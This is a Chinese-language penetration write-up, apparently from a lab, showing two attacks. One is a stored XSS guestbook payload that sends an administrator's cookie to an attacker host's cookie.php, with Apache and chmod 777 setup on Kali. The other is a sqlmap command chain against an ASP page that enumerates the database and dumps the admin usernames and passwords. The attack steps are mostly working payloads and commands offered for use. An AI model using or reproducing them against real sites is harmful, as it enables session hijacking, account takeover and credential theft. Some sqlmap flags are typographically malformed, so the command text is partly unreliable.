海河工作室xss漏洞可获取超级管理员权限

进入网站

留言板输入脚本

脚本内容如下：
<script>document.location='http://192.168.65.100/cookie.php?cookie='+document.cookie;</script>

​​​​
此脚本是为了管理员查看留言时自动获取cookie。其中Ip地址为攻击机，并且在攻击机中写一个cookie.php,内容如下：

获取的cookie值会保存在cookie.txt文件中。

登录后台admin进入后查看新留言。

发现done执行成功。

进入攻击机kali

开启apache2 ，命令如下：
systemctl start apache2
还有要给cookie.txt写入的权限。命令：
chmod 777 -Rf html/
后台查看留言后会自动出现cookie.txt，成功后，查看cookie.txt内容会看到cookie。

hubmb网某处SQL注入导致管理员账号密码泄露

进入网页

网页正常访问，后台也正常。
​​​​

观察URL，尝试SQL注入成功

http://192.168.222.69:81/ArticleRead.asp?id=777
​​​​

尝试用sqlmap爆库

sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –-dbs
结果如图：
​​​​
猜测
sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D user –table
发现没有这个数据库，继续利用sqlmap进行图中操作，得到数据库名和表名，结果如图：
​​​​
sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –column
自动探测出user表中的信息，结果如图：
​​​​
sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –C user_id,user_pwd –dump
可自动探测出用户名和密码内容，结果如图：
​​​​
获取到后台账号密码就可以登录后台了。
